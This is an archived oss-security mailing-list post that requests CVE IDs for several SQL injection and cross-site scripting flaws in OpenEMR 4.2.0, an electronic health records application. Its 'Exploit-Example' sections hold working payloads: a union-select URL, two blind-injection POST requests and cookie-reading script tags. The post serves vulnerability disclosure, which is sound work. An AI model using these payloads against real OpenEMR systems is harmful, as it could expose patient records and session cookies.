X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3792" "Sunday" "22" "March" "2015" "17:56:12" "+0100" "=?UTF-8?B?U3RlZmZlbiBSw7ZzZW1hbm4=?=" "steffen.roesemann1986@gmail.com" "<CALH-=7yNNrVGfD2u-+Yv7PLQ+tYi+qHcuYu4dD0H6GQQCdF21w@mail.gmail.com>" "124" "[oss-security] CVE-Request -- openEMR v. 4.2.0 -- Multiple stored/reflecting XSS- and SQLi vulns" nil nil nil "3" "2015032216:56:12" "[oss-security] CVE-Request -- openEMR v. 4.2.0 -- Multiple stored/reflecting XSS- and SQLi vulns" (number mark "        steffen.roes Mar 22  124/3792  " thread-indent "\"[oss-security] CVE-Request -- openEMR v. 4.2.0 -- Multiple stored/reflecting XSS- and SQLi vulns\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 7472 invoked by uid 550); 22 Mar 2015 16:57:07 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 6098 invoked from network); 22 Mar 2015 16:56:23 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:date:message-id:subject:from:to:content-type;
        bh=EFE2GEnN+XySt+M7Rr6pR53mKRx7Y9sexTwxEcKaUnc=;
        b=VTfZ/FwEEk25+iMqTXFO6yJYPG/7zIuQ2sJJM6x7EfiVLxPhzoiFnB9ZFeo5cerdeA
         aZmD7Wns5OqkAuhtMHlx2MPcrPjL9vg+4jMaO4ABszwGifdaZItNzw3uOK1ctxJiPWD1
         4JVnBO1V77s2J0ZXMkGQDdgUYPFnR0XZOrYoPqkfqYIc8ta2xM/ppIufpmh+oXm7KnC0
         w6nHocOe9tTMcH2riiJ9b/yF8o3HksObQE7TBUQF0GUndpwLsmOwmo4Qpvee7FubWVtf
         YM0+5/5OyFjWM5BERPKvlmv8H1qL7n1MLYLhJEkfwWsGP0QWq9v9Ro2nbqoWjgN2KM1d
         Pa0w==
MIME-Version: 1.0
X-Received: by 10.112.182.69 with SMTP id ec5mr77540703lbc.118.1427043372369;
 Sun, 22 Mar 2015 09:56:12 -0700 (PDT)
Message-ID: <CALH-=7yNNrVGfD2u-+Yv7PLQ+tYi+qHcuYu4dD0H6GQQCdF21w@mail.gmail.com>
Content-Type: multipart/alternative; boundary=001a11c3686e4a0c5b0511e36de2
Date: Sun, 22 Mar 2015 17:56:12 +0100
From: =?UTF-8?Q?Steffen_R=C3=B6semann?= <steffen.roesemann1986@gmail.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] CVE-Request -- openEMR v. 4.2.0 -- Multiple stored/reflecting XSS-
 and SQLi vulns
To: oss-security@lists.openwall.com

--001a11c3686e4a0c5b0511e36de2
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: quoted-printable

Hi Steve, Josh, vendors, list.

I found multiple reflecting/stored XSS- and SQLi-vulns in electronic health
records and medical practice application openEMR v. 4.2.0.

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Technical Details:
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

All below described vulnerabilities can only be exploited by an already
authenticated user.

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
SQL injection vulnerabilities
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

An SQL injection vulnerability can be found in the facility_admin.php file
and can be abused by an attacker via the fid-parameter.

Exploit-Example:

http://
{TARGET}/interface/usergroup/facility_admin.php?fid=3D3%27+and+1=3D2+union+=
select+1,user%28%29,3,4,version%28%29,database%28%29,7,8,9,10,11,12,13,14,1=
5,16,17,18,19,20,21,22,23+--+



Another (blind) SQL injection vulnerability resides in the
appt_encounter_report.php an can be abused by an attacker by modifying a
the form_facility-parameter in a POST-request.

Exploit-Example:

POST /openemr-4.2.0/interface/reports/appt_encounter_report.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101
Firefox/31.0 Iceweasel/31.3.0
Accept: text/html,application/xhtml+xml,application/xml;q=3D0.9,*/*;q=3D0.8
Accept-Language: en-US,en;q=3D0.5
Accept-Encoding: gzip, deflate
Referer:
http://localhost/openemr-4.2.0/interface/reports/appt_encounter_report.php
Cookie: OpenEMR=3Dp30d0tu19a9r04tjgnuu1oqqq4
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 120

form_facility=3D3%27+AND+substring(version(),1,1)=3D%275&form_from_date=3D2=
015-01-13&form_to_date=3D2015-01-13&form_refresh=3Dtrue


The last (blind) SQL injection vulnerability resides in the
appointments_report.php-file and can be as well abused by an attacker via
crafting own SQL statements in the form_facility-parameter in a POST
request.


Exploit-Example:

POST /openemr-4.2.0/interface/reports/appointments_report.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101
Firefox/31.0 Iceweasel/31.3.0
Accept: text/html,application/xhtml+xml,application/xml;q=3D0.9,*/*;q=3D0.8
Accept-Language: en-US,en;q=3D0.5
Accept-Encoding: gzip, deflate
Referer:
http://localhost/openemr-4.2.0/interface/reports/appointments_report.php
Cookie: OpenEMR=3Dp30d0tu19a9r04tjgnuu1oqqq4
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 199

form_facility=3D3%27+and+substring(version(),1,1)=3D%274&form_provider=3D&f=
orm_from_date=3D2015-01-13&form_to_date=3D2015-01-13&form_apptstatus=3D&for=
m_apptcat=3DALL&form_orderby=3Dcomment&patient=3D&form_refresh=3Dtrue


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
XSS vulnerabilities
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

A reflecting XSS-vulnerability can be found in user_admin.php via the
id-parameter.

Exploit-Example:

http://
{TARGET}interface/usergroup/user_admin.php?id=3D4%22%3E%3Cscript%3Ealert%28=
document.cookie%29%3C/script%3E



A stored XSS vulnerability resides in add_edit_event.php via the
input-field "form_comments" and is executed in appointments_report.php.


Exploit-Example:

<script>alert(document.cookie)</script>


Can I get a CVE-ID / CVE-IDs for my findings?

Thank you very much.

Greetings from Germany.

Steffen R=C3=B6semann


References:

[1] http://www.open-emr.org
[2] http://sroesemann.blogspot.de/2015/01/sroeadv-2015-08.html
[3] http://www.open-emr.org/wiki/index.php/OpenEMR_Patches
[4] http://seclists.org/fulldisclosure/2015/Mar/145

--001a11c3686e4a0c5b0511e36de2--
